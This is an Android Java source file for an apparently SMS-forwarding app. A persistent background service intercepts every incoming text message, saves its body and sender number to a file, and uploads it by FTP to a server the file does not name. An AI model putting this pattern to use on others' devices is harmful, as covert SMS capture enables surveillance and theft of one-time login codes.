package com.dev.kt.ktsmsreceiver.utils;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.SmsMessage;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Андрей on 13.03.2017.
 */

public class SmsService extends Service {

    private static final String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final String DATE_MASK = "yyyy-MM-dd_HH-mm-ss_";


    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Thread newThread = new Thread(new Runnable() {
            @Override
            public void run() {
                IntentFilter filter = new IntentFilter(SMS_ACTION);
                filter.setPriority(100);
                registerReceiver(mSmsReceiver, filter);
            }
        });
        newThread.start();
        return Service.START_STICKY;
    }


    private BroadcastReceiver mSmsReceiver = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {

            if (intent != null && intent.getAction() != null && SMS_ACTION.compareToIgnoreCase(intent.getAction()) == 0) {
                Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
                SmsMessage[] messages = new SmsMessage[pduArray.length];
                for (int i = 0; i < pduArray.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
                }

                StringBuilder bodyText = new StringBuilder();
                for (int i = 0; i < messages.length; i++) {
                    bodyText.append(messages[i].getMessageBody());
                }

                onGetSms(bodyText.toString(), messages[0].getOriginatingAddress());
            }
        }
    };

    private void onGetSms(String sms_body, String sms_number) {
        SimpleDateFormat sdf = new SimpleDateFormat(DATE_MASK);
        String file_name = sdf.format(new Date()) + sms_number + ".txt";

        DeviceManager.generateNoteOnSD(file_name, sms_body);

        String path = Environment.getExternalStorageDirectory() + "/Notes/";
        FtpHelper.storeFile(file_name, path);
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mSmsReceiver);
    }

}
